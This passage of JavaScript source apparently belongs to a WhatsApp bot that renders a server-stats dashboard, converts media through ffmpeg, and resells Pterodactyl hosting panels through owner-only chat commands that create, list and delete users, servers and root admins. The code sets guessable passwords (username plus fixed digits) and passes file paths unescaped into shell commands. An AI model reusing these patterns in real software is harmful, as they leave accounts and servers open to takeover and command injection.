            gradient.addColorStop(1, THEME.purple);
            ctx.strokeStyle = gradient;
            ctx.lineWidth = 3;
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.moveTo(x - size, y); ctx.lineTo(x, y - size); ctx.lineTo(x + size, y); ctx.lineTo(x, y + size); ctx.closePath(); ctx.stroke();
            ctx.beginPath(); ctx.moveTo(x - size / 2, y); ctx.lineTo(x, y - size / 2); ctx.lineTo(x + size / 2, y); ctx.lineTo(x, y + size / 2); ctx.closePath(); ctx.stroke();
            ctx.restore();
        }

        function drawDonutChart(ctx, x, y, radius, lineWidth, percent, color) {
            ctx.save();
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.arc(x, y, radius, 0, Math.PI * 2);
            ctx.strokeStyle = THEME.bgSecondary; ctx.lineWidth = lineWidth; ctx.stroke();
            const startAngle = -Math.PI / 2;
            const endAngle = startAngle + (Math.PI * 2 * (percent / 100));
            ctx.shadowColor = color; ctx.shadowBlur = 10;
            ctx.beginPath(); ctx.arc(x, y, radius, startAngle, endAngle);
            ctx.strokeStyle = color; ctx.lineWidth = lineWidth; ctx.stroke();
            ctx.shadowBlur = 0;
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 28px Arial";
            ctx.textAlign = "center"; ctx.textBaseline = "middle";
            ctx.fillText(`${Math.round(percent)}%`, x, y);
            ctx.restore();
        }

        function drawProgressBar(ctx, x, y, w, h, percent, color, label, value) {
            ctx.fillStyle = THEME.bgSecondary; ctx.fillRect(x, y, w, h);
            const gradient = ctx.createLinearGradient(x, y, x + w, y);
            gradient.addColorStop(0, color); gradient.addColorStop(1, color + 'aa');
            ctx.fillStyle = gradient; ctx.fillRect(x, y, w * (percent / 100), h);
            ctx.strokeStyle = THEME.border; ctx.lineWidth = 1; ctx.strokeRect(x, y, w, h);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x, y - 6);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 11px Arial"; ctx.textAlign = "right"; ctx.fillText(value, x + w, y - 6);
        }

        function drawStatBox(ctx, x, y, w, h, label, value, color, iconType) {
            drawCard(ctx, x, y, w, h, 12);
            drawIcon(ctx, x + 28, y + 28, iconType, color);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x + 50, y + 22);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 16px Arial"; ctx.fillText(value, x + 50, y + 40);
        }

        async function renderDashboard(stats) {
            const W = 1200;
            const H = 800;
            const canvas = createCanvas(W, H);
            const ctx = canvas.getContext('2d');

            drawBackground(ctx, W, H);
            drawLogo(ctx, 60, 50, 20);

            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 32px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM MONITOR", 100, 58);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "13px Arial"; ctx.fillText("Real-time Performance Dashboard", 100, 80);

            const pingStatus = stats.ping < 100 ? THEME.success : stats.ping < 300 ? THEME.warning : THEME.danger;
            ctx.fillStyle = pingStatus; ctx.font = "bold 28px Arial"; ctx.textAlign = "right"; ctx.fillText(`${stats.ping}ms`, W - 50, 50);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("LATENCY", W - 50, 70);

            const gradient = ctx.createLinearGradient(50, 100, W - 50, 100);
            gradient.addColorStop(0, THEME.primary); gradient.addColorStop(0.33, THEME.success); gradient.addColorStop(0.66, THEME.purple); gradient.addColorStop(1, THEME.cyan);
            ctx.strokeStyle = gradient; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(50, 100); ctx.lineTo(W - 50, 100); ctx.stroke();

            const mainY = 130, cardW = 260, cardH = 240, gap = 30;
            const x1 = 50, x2 = x1 + cardW + gap, x3 = x2 + cardW + gap, x4 = x3 + cardW + gap;

            drawCard(ctx, x1, mainY, cardW, cardH, 15);
            drawIcon(ctx, x1 + 30, mainY + 35, 'cpu', THEME.primary);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("CPU USAGE", x1 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`${stats.cpuCores} Cores @ ${stats.cpuSpeed} MHz`, x1 + 55, mainY + 58);
            drawDonutChart(ctx, x1 + cardW / 2, mainY + 140, 50, 12, stats.cpuLoad, THEME.primary);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(stats.cpuModel.substring(0, 32), x1 + cardW / 2, mainY + 215);

            drawCard(ctx, x2, mainY, cardW, cardH, 15);
            drawIcon(ctx, x2 + 30, mainY + 35, 'memory', THEME.success);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("MEMORY", x2 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.ramTotal)}`, x2 + 55, mainY + 58);
            const ramPercent = (stats.ramUsed / stats.ramTotal) * 100;
            drawDonutChart(ctx, x2 + cardW / 2, mainY + 140, 50, 12, ramPercent, THEME.success);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.ramUsed)} Used`, x2 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.ramTotal - stats.ramUsed)} Free`, x2 + cardW / 2, mainY + 220);

            drawCard(ctx, x3, mainY, cardW, cardH, 15);
            drawIcon(ctx, x3 + 30, mainY + 35, 'disk', THEME.purple);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("STORAGE", x3 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Total: ${formatSize(stats.diskTotal)}`, x3 + 55, mainY + 58);
            let diskPercent = stats.diskTotal > 0 ? (stats.diskUsed / stats.diskTotal) * 100 : 0;
            drawDonutChart(ctx, x3 + cardW / 2, mainY + 140, 50, 12, diskPercent, THEME.purple);
            ctx.fillStyle = THEME.textTertiary; ctx.font = "11px Arial"; ctx.textAlign = "center"; ctx.fillText(`${formatSize(stats.diskUsed)} Used`, x3 + cardW / 2, mainY + 205); ctx.fillText(`${formatSize(stats.diskTotal - stats.diskUsed)} Free`, x3 + cardW / 2, mainY + 220);

            drawCard(ctx, x4, mainY, cardW, cardH, 15);
            drawIcon(ctx, x4 + 30, mainY + 35, 'network', THEME.cyan);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("NETWORK", x4 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`Interface: ${stats.networkInterface}`, x4 + 55, mainY + 58);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.textAlign = "left"; ctx.fillText("RX (Download)", x4 + 30, mainY + 95);
            ctx.fillStyle = THEME.cyan; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkRx), x4 + 30, mainY + 120);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText("TX (Upload)", x4 + 30, mainY + 155);
            ctx.fillStyle = THEME.pink; ctx.font = "bold 20px Arial"; ctx.fillText(formatSize(stats.networkTx), x4 + 30, mainY + 180);

            const statsY = 400, statW = 175, statH = 70, statGap = 20;
            drawStatBox(ctx, 50, statsY, statW, statH, "HOSTNAME", stats.hostname.substring(0, 15), THEME.primary, 'server');
            drawStatBox(ctx, 50 + (statW + statGap), statsY, statW, statH, "PLATFORM", `${stats.platform} (${stats.arch})`, THEME.success, 'server');
            drawStatBox(ctx, 50 + (statW + statGap) * 2, statsY, statW, statH, "BOT UPTIME", stats.uptimeBot, THEME.purple, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 3, statsY, statW, statH, "SERVER UPTIME", stats.uptimeServer, THEME.warning, 'clock');
            drawStatBox(ctx, 50 + (statW + statGap) * 4, statsY, statW, statH, "NODE.JS", stats.nodeVersion, THEME.cyan, 'server');

            const perfY = 500, perfH = 250, perfW = W - 100;
            drawCard(ctx, 50, perfY, perfW, perfH, 15);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 20px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM PERFORMANCE", 75, perfY + 35);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("Real-time resource monitoring", 75, perfY + 55);

            const barY = perfY + 85, barW = 500, barH = 18, barGap = 35;
            drawProgressBar(ctx, 75, barY, barW, barH, stats.cpuLoad, THEME.primary, "CPU Load", `${stats.cpuLoad}%`);
            drawProgressBar(ctx, 75, barY + barGap, barW, barH, ramPercent, THEME.success, "Memory Usage", `${Math.round(ramPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 2, barW, barH, diskPercent, THEME.purple, "Disk Usage", `${Math.round(diskPercent)}%`);
            drawProgressBar(ctx, 75, barY + barGap * 3, barW, barH, Math.min(100, (stats.ping / 500) * 100), pingStatus, "Network Latency", `${stats.ping}ms`);

            const infoX = 620, infoStartY = perfY + 85, infoLineHeight = 28;
            let infoY = infoStartY;
            ctx.font = "13px Arial"; ctx.textAlign = "left";
            const drawInfoLine = (label, value) => {
                ctx.fillStyle = THEME.textSecondary; ctx.fillText(label, infoX, infoY);
                ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 13px Arial"; ctx.fillText(value, infoX + 150, infoY);
                ctx.font = "13px Arial"; infoY += infoLineHeight;
            };
            drawInfoLine("OS Release", stats.release);
            drawInfoLine("CPU Cores", `${stats.cpuCores} Cores`);
            drawInfoLine("CPU Speed", `${stats.cpuSpeed} MHz`);
            drawInfoLine("Total Memory", formatSize(stats.ramTotal));
            drawInfoLine("Free Memory", formatSize(stats.ramTotal - stats.ramUsed));
            ctx.fillStyle = THEME.textTertiary; ctx.font = "10px Arial"; ctx.textAlign = "center"; ctx.fillText(`Dashboard Generated: ${new Date().toLocaleString()}`, W / 2, H - 20);
            return canvas.toBuffer('image/png');
        }

        function getNetworkStats() {
            try {
                const interfaces = os.networkInterfaces();
                let totalRx = 0, totalTx = 0, activeInterface = 'N/A', ip = 'N/A';
                for (const [name, addrs] of Object.entries(interfaces)) {
                    if (name.toLowerCase().includes('lo')) continue;
                    for (const addr of addrs) {
                        if (addr.family === 'IPv4' && !addr.internal) { activeInterface = name; ip = addr.address; break; }
                    }
                }
                try {
                    const netstat = execSync("cat /proc/net/dev 2>/dev/null || echo ''").toString();
                    const lines = netstat.split('\n');
                    for (const line of lines) {
                        if (line.includes(':') && !line.includes('lo:')) {
                            const parts = line.trim().split(/\s+/);
                            if (parts.length >= 10) { totalRx += parseInt(parts[1]) || 0; totalTx += parseInt(parts[9]) || 0; }
                        }
                    }
                } catch (e) {}
                return { totalRx, totalTx, activeInterface, ip };
            } catch (e) {
                return { totalRx: 0, totalTx: 0, activeInterface: 'N/A', ip: 'N/A' };
            }
        }

        const start = performance.now();
        await new Promise(resolve => setTimeout(resolve, 10));
        const end = performance.now();
        const latency = (end - start).toFixed(2);

        const cpus = os.cpus();
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const loadAvg = os.loadavg();
        const cpuPercent = Math.min(100, (loadAvg[0] * 100) / cpus.length).toFixed(1);

        let diskTotal = 0, diskUsed = 0;
        try {
            const df = execSync("df -k --output=size,used / 2>/dev/null").toString();
            const lines = df.trim().split("\n");
            if (lines.length > 1) {
                const [total, used] = lines[1].trim().split(/\s+/).map(Number);
                diskTotal = total * 1024;
                diskUsed = used * 1024;
            }
        } catch (e) {}

        const networkStats = getNetworkStats();

        const stats = {
            ping: latency,
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            release: os.release(),
            nodeVersion: process.version,
            uptimeBot: formatTime(process.uptime()),
            uptimeServer: formatTime(os.uptime()),
            cpuModel: cpus[0].model.trim(),
            cpuSpeed: cpus[0].speed,
            cpuCores: cpus.length,
            cpuLoad: cpuPercent,
            ramTotal: totalMem,
            ramUsed: totalMem - freeMem,
            diskTotal: diskTotal,
            diskUsed: diskUsed,
            networkRx: networkStats.totalRx,
            networkTx: networkStats.totalTx,
            networkInterface: networkStats.activeInterface,
            networkIP: networkStats.ip
        };

        const imageBuffer = await renderDashboard(stats);

        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `*SERVER - INFORMATION 🔴*\n\n` +
                `- Latency: ${latency}ms\n` +
                `- CPU: ${stats.cpuLoad}%\n` +
                `- RAM: ${formatSize(stats.ramUsed)} / ${formatSize(stats.ramTotal)}\n` +
                `- Disk: ${formatSize(stats.diskUsed)} / ${formatSize(stats.diskTotal)}\n` +
                `- Network: ↓${formatSize(stats.networkRx)} ↑${formatSize(stats.networkTx)}`
        }, {
            quoted: m
        });

    } catch (e) {
        console.error(e);
        m.reply(`Error: ${e.message}`);
    }
}
break;

case "own": case "owner": {
await sock.sendContact(m.chat, [global.owner], global.namaOwner, "Developer Bot", m)
await m.reply(`Hi *${m.pushName}*, this is my creator's contact ✨`)
}
break 

// ** case tools menu **
case "toimg": case "toimage":{
  if (!qmsg) return reply("Reply to the sticker you want to convert!");
  if (!/webp/.test(mime)) return reply(`Reply to a sticker with caption *${prefix + command}*`);

  const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
  const outputPath = getRandom(".png");

  exec(`ffmpeg -i ${mediaPath} ${outputPath}`, async (err) => {
    fs.unlinkSync(mediaPath);
    if (err) {
      console.error(err);
      return reply("Failed to convert sticker to image!");
    }

    try {
      const buffer = fs.readFileSync(outputPath);
      await sock.sendMessage(
        m.chat,
        { image: buffer, caption: "*Successfully converted to image!*" },
        { quoted: m }
      );
    } catch (e) {
      console.error(e);
      reply("An error occurred while sending the image.");
    } finally {
      fs.unlinkSync(outputPath);
    }
  });
}
break

case 'toptt': case 'tovn': case 'tovoicenote': {
    const quoted = m.quoted ? m.quoted : m;
    if (!/audio|video/.test(mime)) {
        return m.reply(`Reply to a video or audio you want to convert to VN!\n\nExample: *${prefix + command}*`);
    }

    m.reply("Wait...");

    let mediaPath = null;
    let outPath = null;

    try {
        mediaPath = await sock.downloadAndSaveMediaMessage(quoted);
        if (!mediaPath) return m.reply("Failed to download media.");

        outPath = path.join(process.cwd(), 'data', 'trash', `vn_${Date.now()}.ogg`);
        
        if (!fs.existsSync(path.dirname(outPath))) fs.mkdirSync(path.dirname(outPath), { recursive: true });

        await new Promise((resolve, reject) => {
            exec(`ffmpeg -y -i "${mediaPath}" -vn -c:a libopus -b:a 128k -ac 1 -ar 48000 -map_metadata -1 "${outPath}"`, (err) => {
                if (err) return reject(err);
                resolve();
            });
        });

        await sock.sendMessage(m.chat, {
            audio: { url: outPath },
            mimetype: "audio/ogg; codecs=opus",
            ptt: true
        }, { quoted: m });

        if (fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
        if (fs.existsSync(outPath)) fs.unlinkSync(outPath);

    } catch (err) {
        console.error(err);
        if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath);
        if (outPath && fs.existsSync(outPath)) fs.unlinkSync(outPath);
        m.reply("❌ Failed to convert to VN. Make sure FFmpeg is installed.");
    }
}
break;

// ** case create panel menu **
case "addgrupreseller":
case "addgrupreseller":
case "addseller": {
  if (!isWaz) return reply(mess.owner)
  if (!m.isGroup) return reply(mess.group)
  const input = m.chat
  if (datagc.includes(input))
    return reply(`This group already has panel reseller access!`)
  datagc.push(input)
  await fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
  reply(`Successfully added panel reseller group ✅`)
}
break

case "delgrupseller":
case "delgrupreseller": {
  if (!isWaz) return reply(mess.owner)
  if (datagc.length < 1) return reply("There are no panel reseller groups!")
  if (!text && m.isGroup) {
    if (!datagc.includes(m.chat))
      return reply("This group is not a panel reseller group!")

    datagc.splice(datagc.indexOf(m.chat), 1)
    fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
    return reply("Successfully removed panel reseller group ✅")
  }

  if (!text)
    return reply(
      `Enter the *list number* of the group!
      
*Example:*
- ${prefix}delresseler 2
- ${prefix}listresseler (to see details)`
    )

  if (text === "all") {
    datagc.length = 0
    fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))
    return reply("Successfully removed *all* panel reseller groups ✅")
  }

  let nomor = parseInt(text)
  if (isNaN(nomor))
    return reply("Enter the *number* according to the list number!")

  let index = nomor - 1
  if (index < 0 || index >= datagc.length)
    return reply("Invalid number!")

  let removed = datagc[index]
  datagc.splice(index, 1)
  fs.writeFileSync("./data/reseller.json", JSON.stringify(datagc, null, 2))

  reply(
    `Successfully removed panel reseller group ✅
- ID Groups: *${removed}*`
  )
}
break

case "listgrupseller":
case "listress": {
  if (!isWaz) return reply(mess.owner)
  if (datagc.length < 1) return reply("There are no reseller groups in data!")

  let teks = `*List of all reseller groups*\n\n`
  let no = 1

  for (let id of datagc) {
    let name = "Not found"
    try {
      let meta = await sock.groupMetadata(id)
      name = meta.subject || name
    } catch {}

    teks += `${no}. *${name}*\n`
    teks += ` ┣𖣠 Id: \`${id}\`\n\n`
    no++
  }

  teks += `*How to delete:*
- ${prefix}delresseler its number
- ${prefix}delresseler directly in the group`

  await sock.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "1gbv2": case "2gbv2": case "3gbv2": case "4gbv2": case "5gbv2": case "6gbv2": case "7gbv2": case "8gbv2": case "9gbv2": case "10gbv2": case "unlimitedv2": case "unliv2": {
if (!isWaz && !isGrupPrem) return m.reply('Only owner and groups with Reseller access')
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gbv2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv2") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gbv2") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gbv2") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gbv2") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gbv2") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gbv2") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gbv2") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gbv2") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gbv2") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+"990"
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*Your Panel Account Data 📦*

*📡 Server ID (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Server Specifications*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Terms & Conditions :*
${global.teksPanel}
`
await fs.writeFileSync("akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "listpanelv2": case "listpv2": case "listserverv2": {
if (!isWaz) return m.reply(mess.owner)
if (!global.apikey) return m.reply("Apikey not found!\nMake sure *global.apikey* is filled in settings.js!")
let page = 1
let allServers = []
  while (true) {
    let res = await fetch(`${global.domainV2}/api/application/servers?page=${page}`, {
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${global.apikeyV2}`
      }
    })

    let data = await res.json()
    if (!data.data || data.data.length === 0) break

    allServers.push(...data.data)

    if (!data.meta?.pagination || page >= data.meta.pagination.total_pages) break
    page++
  }

  if (!allServers.length) return m.reply("There are no panel servers.")

  let teks = `*List of all panel servers*\n> #Total: *${allServers.length} servers*\n\n`
  let no = 1

  for (let srv of allServers) {
    let s = srv.attributes
    let uuid = s.uuid.split("-")[0]
    let status = "unknown"

    try {
      let res = await fetch(`${global.domain}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${global.capikey}`
        }
      })
      let json = await res.json()
      status = json.attributes?.current_state?.toUpperCase() || "unknown"
    } catch (e) {
      status = "unknown"
    }

    teks += `  ⚪ Server ID : *${s.id}*\n`
    teks += `  ⚫ User ID : *${s.user}*\n`
    teks += `  📍 Name : *${s.name}*\n`
    teks += `  💾 RAM : *${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}*\n`
    teks += `┣𖣠 Status : *${status}*\n\n`
  }
  return sock.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "delpanelv2":
case "delpv2": {
  if (!isWaz) return m.reply(mess.owner)
  if (global.apikey.length < 1) return m.reply("Apikey not found!\nMake sure *global.apikey* is filled in settings.js!")
  if (!args[0]) return m.reply(example(`server id\n\nto see the server id type *${prefix}listpanel*`))

  let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikeyV2
    }
  })
  let result = await f.json()
  let servers = result.data
  let deletedUserId = null
  let deletedServerName = null

  for (let server of servers) {
    let s = server.attributes
    if (args[0] == s.id.toString()) {
      deletedUserId = s.user // <-- get user ID from server
      deletedServerName = s.name

      // Delete server
      await fetch(global.domainV2 + `/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + global.apikeyV2
        }
      })
    }
  }
  if (!deletedUserId) return m.reply("*Server ID* Not Found")
  // Delete user based on user ID
  await fetch(global.domainV2 + `/api/application/users/${deletedUserId}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikeyV2
    }
  })
  m.reply(`Successfully Deleted Panel Account *${capital(deletedServerName)}* (Server & User)`)
}
break

case "cadminv2": case "cadpv2": {
if (!isWaz) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+"001"
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created admin panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*Your Admin Panel Account Data 📦*

*📡 User ID (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
* ${global.domainV2}

*Terms & Conditions :*
* Account expires in 1 month
* Keep this data as safe as possible
* Don't randomly delete servers!
* Caught stealing sc, auto delete account no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "deladminv2": case "deladpv2": {
if (!isWaz) return m.reply(mess.owner)
if (!args[0]) return m.reply(example(`its id\n\nto see the admin id type *${prefix}listadmin*`))
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Admin ID Not Found!")
m.reply(`Successfully Deleted Admin Panel *${capital(getid)}*`)
}
break

case "listadminv2": case "listadpv2": {
if (!isWaz) return m.reply(mess.owner)
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There are no admin panels")
var teks = "*List of all admin panels*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `  ⚪ User ID : *${i.attributes.id}*
   📍 Name : *${i.attributes.first_name}*\n\n`
})
m.reply(teks)
}
break

  case "clearpanelv2": case "clearserverv2": { 
if (!isWaz) return reply(mess.owner)
await reply(`*Processing deletion of all users & panel servers ⚠️*`)
try {
const headers = {
  "Authorization": "Bearer " + global.apikeyV2,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

async function getUsers() {
  try {
    const res = await axios.get(`${global.domainV2}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

async function getServers() {
  try {
    const res = await axios.get(`${global.domainV2}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${global.domainV2}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} successfully deleted.`);
  } catch (error) {
    console.error(`Failed to delete server ${serverUUID}:`, error.response?.data || error.message);
  }
}
async function deleteUser(userID) {
  try {
    await axios.delete(`${global.domainV2}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} successfully deleted.`);
  } catch (error) {
    console.error(`Failed to delete user ${userID}:`, error.response?.data || error.message);
  }
}
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0
  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Skipping admin: ${user.attributes.username}`);
      continue; // Skip admin
    }
    const userID = user.attributes.id;
    const userEmail = user.attributes.email;
    console.log(`Deleting user: ${user.attributes.username} (${userEmail})`);
    // Find servers owned by this user
    const userServers = servers.filter(srv => srv.attributes.user === userID);
    // Delete all this user's servers
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }
    // Delete user after all their servers are deleted
    await deleteUser(userID);
  }
await reply(`*Finished Cleaning the Panel ✅*

- Total *${totalSrv}* (user & server) panels deleted 

*⚠️ Deleted servers are not admin panels*`)
}
// Run function
return deleteNonAdminUsersAndServers();
} catch (err) {
return reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

case "addserver": case "addsrv": {
  if (!isWaz) return m.reply(mess.owner)
  if (!text) return m.reply(example(`id,name,ram\nType: *${prefix}listpanel* to see id`));
  let [usr_id, nama, ramInput] = text.split(",");
  if (!usr_id || !nama || !ramInput) return m.reply(example(`id,name,ram\nType: *${prefix}listpanel* to see id`));
  usr_id = usr_id.trim();
  nama = nama.trim();
  ramInput = ramInput.trim().toLowerCase();

  let ram, disknya, cpu;

  if (["unli", "unlimited"].includes(ramInput)) {
    ram = disknya = cpu = 0;
